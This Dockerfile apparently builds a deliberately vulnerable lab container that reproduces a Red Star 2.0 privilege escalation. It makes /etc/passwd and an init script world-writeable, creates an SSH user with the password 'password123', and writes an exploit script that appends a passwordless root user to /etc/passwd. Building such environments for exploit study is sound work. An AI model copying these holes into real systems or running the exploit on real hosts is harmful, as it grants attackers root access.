FROM debian:bookworm-slim

# Install required packages
RUN apt-get update && apt-get install -y \
    openssh-server \
    passwd \
    && rm -rf /var/lib/apt/lists/*

# Setup SSH
RUN mkdir -p /var/run/sshd && \
    sed -i 's/#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo 'lowpriv:password123' | chpasswd

# Simulate the Red Star 2.0 vulnerability: world-writeable /etc/rc.d/rc.sysinit
# In Red Star 2.0, /etc/rc.d/rc.sysinit was world-writeable, meaning any user
# could append commands to it that would execute on boot as root.
#
# In a Docker container, we simulate this more directly: /etc/passwd is the
# actual target in the PoC (the exploit appends a root-level user to /etc/passwd).
# The core vulnerability is that a critical system file is world-writeable.
#
# We recreate the exact vulnerability pattern: a world-writeable system init script
# AND we make /etc/passwd world-writeable to match the actual PoC exploitation path
# (since in a container we can't reboot to trigger rc.sysinit execution).

# Create the rc.d directory structure mimicking Red Star 2.0
RUN mkdir -p /etc/rc.d && \
    echo '#!/bin/bash' > /etc/rc.d/rc.sysinit && \
    echo '# Red Star 2.0 rc.sysinit - system initialization script' >> /etc/rc.d/rc.sysinit && \
    chmod 0777 /etc/rc.d/rc.sysinit

# The actual exploitable vulnerability: /etc/passwd is world-writeable
# This mirrors the PoC exactly - the attacker appends a passwordless root user
# In Red Star 2.0, the world-writeable rc.sysinit could modify /etc/passwd on boot;
# here we simulate the end result of that misconfiguration chain.
RUN chmod 0666 /etc/passwd

# Create exploit script matching the original PoC
RUN cat <<'EXPLOIT_EOF' > /home/lowpriv/exploit.sh
#!/bin/bash
# Red Star 2.0 Local Privilege Escalation (OSVDB-116453)
# Exploits world-writeable system files to add a root-level user

echo "[*] Red Star 2.0 - World-writeable file privilege escalation"
echo "[*] Checking /etc/rc.d/rc.sysinit permissions..."
ls -la /etc/rc.d/rc.sysinit
echo "[*] Checking /etc/passwd permissions..."
ls -la /etc/passwd

echo "[*] Adding passwordless root user 'r00t' to /etc/passwd..."
/bin/echo "r00t::0:0::/tmp:/bin/bash" >> /etc/passwd

echo "[+] Done! Now run: su - r00t"
echo "[+] You should get a root shell with no password required."
EXPLOIT_EOF

RUN chown lowpriv:lowpriv /home/lowpriv/exploit.sh && \
    chmod +x /home/lowpriv/exploit.sh

# Verify the vulnerability is in place
RUN ls -la /etc/rc.d/rc.sysinit && \
    ls -la /etc/passwd && \
    test "$(stat -c '%a' /etc/passwd)" = "666" && \
    echo "VULNERABILITY CONFIRMED: /etc/passwd is world-writeable" && \
    test "$(stat -c '%a' /etc/rc.d/rc.sysinit)" = "777" && \
    echo "VULNERABILITY CONFIRMED: /etc/rc.d/rc.sysinit is world-writeable"

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]